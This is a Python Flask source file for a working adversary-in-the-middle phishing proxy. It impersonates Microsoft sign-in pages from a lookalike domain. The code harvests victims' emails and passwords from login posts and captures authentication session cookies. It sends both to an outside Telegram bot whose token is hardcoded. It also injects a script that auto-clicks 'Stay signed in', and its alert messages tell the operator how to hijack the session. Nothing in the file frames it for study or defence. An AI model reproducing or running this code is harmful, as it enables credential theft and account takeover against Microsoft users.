import os
import uuid
import json
import requests
from flask import Flask, request, Response, make_response

app = Flask(__name__)

# --- Config ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

PROXY_DOMAIN = "https://outlook-verify.onrender.com"
PROXY_HOST = "outlook-verify.onrender.com"

# Persistent storage for victim sessions
visitor_sessions = {}
CAPTURED = {}

# --- Telegram ---
def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        # Use HTML parse mode for bold/code
        resp = requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID, 
            "text": message, 
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }, timeout=10)
        print(f"[TG] Status: {resp.status_code}")
        if resp.status_code != 200:
            print(f"[TG ERROR] {resp.text}")
    except Exception as e:
        print(f"[TG EXCEPT] {e}")

# --- Helpers ---
def get_set_cookies(resp):
    """Extract all Set-Cookie headers reliably."""
    cookies = []
    # Try urllib3 raw headers first (most reliable for duplicates)
    raw = getattr(resp, "raw", None)
    if raw and hasattr(raw, "headers"):
        try:
            # getlist is standard for urllib3
            vals = raw.headers.getlist("Set-Cookie")
            if vals:
                return vals
        except:
            pass
        try:
            # fallback
            vals = raw.headers.get_all("Set-Cookie")
            if vals:
                return vals
        except:
            pass
            
    # Fallback to requests headers (might merge duplicates)
    sc = resp.headers.get("Set-Cookie")
    if sc:
        return [sc]
    return []

def rewrite_links(text):
    """Replace Microsoft domains with our proxy domain."""
    replacements = [
        ("https://login.microsoftonline.com", PROXY_DOMAIN),
        ("https://login.live.com", PROXY_DOMAIN),
        ("https://account.live.com", PROXY_DOMAIN),
        ("//login.microsoftonline.com", "//" + PROXY_HOST),
        ("//login.live.com", "//" + PROXY_HOST),
        ("//account.live.com", "//" + PROXY_HOST),
    ]
    for old, new in replacements:
        text = text.replace(old, new)
    return text

def fix_set_cookie(header_value):
    """Strip Domain and Path to ensure cookies stick to our proxy."""
    if not header_value:
        return ""
    parts = [p.strip() for p in header_value.split(";") if p.strip()]
    kept = []
    for p in parts:
        lower = p.lower()
        if lower.startswith("domain=") or lower.startswith("path="):
            continue
        kept.append(p)
    # Force root path
    kept.append("Path=/")
    # Force secure if needed, but usually better to leave as is for http/https mix
    return "; ".join(kept)

def get_session(vid, user_agent):
    if vid not in visitor_sessions:
        s = requests.Session()
        s.headers.update({
            "User-Agent": user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        })
        visitor_sessions[vid] = s
    return visitor_sessions[vid]

def pick_upstream(path):
    """Route specific paths to the correct Microsoft auth server."""
    if path.startswith(("ppsecure/", "GetCredentialType.srf", "ppsecure/")):
        return "https://login.live.com"
    return "https://login.microsoftonline.com"

@app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
@app.route("/<path:path>", methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"])
def proxy(path):
    # 1. Identify Victim
    vid = request.cookies.get("vid")
    new_vid = False
    if not vid:
        vid = str(uuid.uuid4())
        new_vid = True
        send_telegram(f"<b>👋 New Visitor</b>\nVid: <code>{vid}</code>\nIP: {request.remote_addr}")
        print(f"[NEW VISITOR] {vid} from {request.remote_addr}")

    sess = get_session(vid, request.headers.get("User-Agent"))

    # 2. Determine Target URL
    upstream_base = pick_upstream(path)
    target_url = f"{upstream_base}/{path}"
    if request.query_string:
        target_url += "?" + request.query_string.decode()

    # 3. Prepare Headers for Upstream
    headers = {}
    # Forward important headers
    for h in ["Accept", "Accept-Language", "Content-Type", "Origin", "Referer"]:
        if h in request.headers:
            val = request.headers[h]
            # Rewrite Referer/Origin to point to Microsoft, not us
            if h in ["Referer", "Origin"]:
                val = val.replace(PROXY_DOMAIN, upstream_base)
            headers[h] = val
    
    # Handle Content-Length automatically by requests library

    # 4. Execute Request
    try:
        if request.method == "POST":
            # Check if it's JSON or Form Data
            content_type = request.content_type or ""
            
            if "application/json" in content_type:
                # Handle JSON POST (modern MS flow)
                json_data = request.get_json(silent=True)
                print(f"[JSON POST] Vid: {vid} | Data: {json_data}")
                
                # Capture credentials from JSON
                if json_data:
                    check_capture_json(vid, json_data)
                    
                resp = sess.post(target_url, json=json_data, headers=headers, allow_redirects=False, timeout=30)
            else:
                # Handle Form Data
                print(f"[FORM POST] Vid: {vid} | Keys: {list(request.form.keys())}")
                
                # Capture credentials from Form
                check_capture_form(vid, request.form)
                
                resp = sess.post(target_url, data=request.form, headers=headers, allow_redirects=False, timeout=30)
        elif request.method == "OPTIONS":
            # Handle CORS preflight
            resp = make_response()
            resp.headers['Access-Control-Allow-Origin'] = '*'
            resp.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp
        else:
            resp = sess.get(target_url, headers=headers, allow_redirects=False, timeout=30)
            
    except Exception as e:
        print(f"[PROXY ERROR] {e}")
        return f"Proxy Error: {str(e)}", 502

    # 5. Check for Cookies (Session Hijacking)
    info = CAPTURED.get(vid)
    if info and not info.get("sent_cookies"):
        cookies = sess.cookies.get_dict()
        # Filter for high-value auth cookies
        auth_cookies = {k: v for k, v in cookies.items() if any(x in k for x in ["ESTSAUTH", "RPSSecAuth", "MSFPC", "ANON", "MSPRequ"])}
        
        if auth_cookies:
            info["sent_cookies"] = True
            cookie_str = "\n".join([f"<code>{k}={v[:30]}...</code>" for k, v in auth_cookies.items()])
            msg = (
                f"<b>🍪 SESSION COOKIES CAPTURED</b>\n\n"
                f"<b>Email:</b> <code>{info.get('email', 'Unknown')}</code>\n\n"
                f"<b>Cookies:</b>\n{cookie_str}\n\n"
                f"<i>Use these cookies in a browser extension like 'Cookie Editor' to hijack the session.</i>"
            )
            send_telegram(msg)
            print(f"[COOKIE SENT] Vid {vid}")

    # 6. Build Response
    r = Response(status=resp.status_code)
    
    # Handle Redirects
    if "Location" in resp.headers:
        loc = resp.headers["Location"]
        loc = loc.replace("https://login.microsoftonline.com", PROXY_DOMAIN)
        loc = loc.replace("https://login.live.com", PROXY_DOMAIN)
        loc = loc.replace("https://account.live.com", PROXY_DOMAIN)
        # Ensure absolute URL for Location header
        if loc.startswith("/"):
            loc = PROXY_DOMAIN + loc
        r.headers["Location"] = loc

    # Handle Body
    content_type = resp.headers.get("Content-Type", "")
    body = resp.content

    if "text/html" in content_type:
        text = body.decode("utf-8", errors="ignore")
        text = rewrite_links(text)
        
        # Inject KMSI Auto-Clicker
        inject_script = """
        <script>
        setTimeout(function() {
            // Try to find the "Yes" button for Stay Signed In
            var btn = document.querySelector('#idSIButton9, input[type="submit"][value="Yes"], button[type="submit"]');
            if (btn) {
                console.log('[PHISH] Auto-clicking KMSI');
                btn.click();
            }
        }, 1000);
        </script>
        """
        if "</body>" in text:
            text = text.replace("</body>", inject_script + "</body>")
        body = text.encode("utf-8")
        
    elif "text/css" in content_type:
        text = body.decode("utf-8", errors="ignore")
        body = rewrite_links(text).encode("utf-8")
        
    elif "application/json" in content_type:
        # Rewrite JSON URLs if present
        try:
            json_text = body.decode("utf-8")
            json_text = rewrite_links(json_text)
            body = json_text.encode("utf-8")
        except:
            pass

    r.set_data(body)
    if content_type:
        r.headers["Content-Type"] = content_type

    # Forward Set-Cookie headers
    for cookie_header in get_set_cookies(resp):
        fixed = fix_set_cookie(cookie_header)
        if fixed:
            r.headers.add("Set-Cookie", fixed)

    # Set VID cookie if new
    if new_vid:
        r.set_cookie("vid", vid, max_age=86400, path="/", samesite="Lax", httponly=True)

    return r

def check_capture_form(vid, form_data):
    """Check form data for passwords."""
    passwd = None
    email = None
    
    # Common field names for password
    for key in ["passwd", "Password", "pwd", "password", "Passwd"]:
        if key in form_data:
            passwd = form_data[key]
            break
            
    # Common field names for email
    for key in ["loginfmt", "login", "username", "EmailAddress", "user"]:
        if key in form_data:
            email = form_data[key]
            break
            
    if passwd:
        print(f"[CAPTURE FORM] Vid: {vid} | Email: {email} | Pass: {passwd}")
        save_capture(vid, email, passwd)

def check_capture_json(vid, json_data):
    """Check JSON data for passwords."""
    passwd = None
    email = None
    
    # Recursive search for password fields
    def find_passwords(obj):
        nonlocal passwd, email
        if isinstance(obj, dict):
            for k, v in obj.items():
                if k.lower() in ["passwd", "password", "pwd"] and isinstance(v, str):
                    passwd = v
                if k.lower() in ["loginfmt", "login", "username", "user"] and isinstance(v, str):
                    email = v
                else:
                    find_passwords(v)
        elif isinstance(obj, list):
            for item in obj:
                find_passwords(item)
                
    find_passwords(json_data)
    
    if passwd:
        print(f"[CAPTURE JSON] Vid: {vid} | Email: {email} | Pass: {passwd}")
        save_capture(vid, email, passwd)

def save_capture(vid, email, passwd):
    if vid not in CAPTURED:
        CAPTURED[vid] = {"sent_pw": False, "sent_cookies": False}
        
    CAPTURED[vid]["email"] = email
    CAPTURED[vid]["password"] = passwd
    
    if not CAPTURED[vid]["sent_pw"]:
        CAPTURED[vid]["sent_pw"] = True
        msg = (
            f"<b>🔑 PASSWORD CAPTURED</b>\n\n"
            f"<b>Email:</b> <code>{email}</code>\n"
            f"<b>Password:</b> <code>{passwd}</code>\n\n"
            f"<i>Waiting for session cookies...</i>"
        )
        send_telegram(msg)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False)
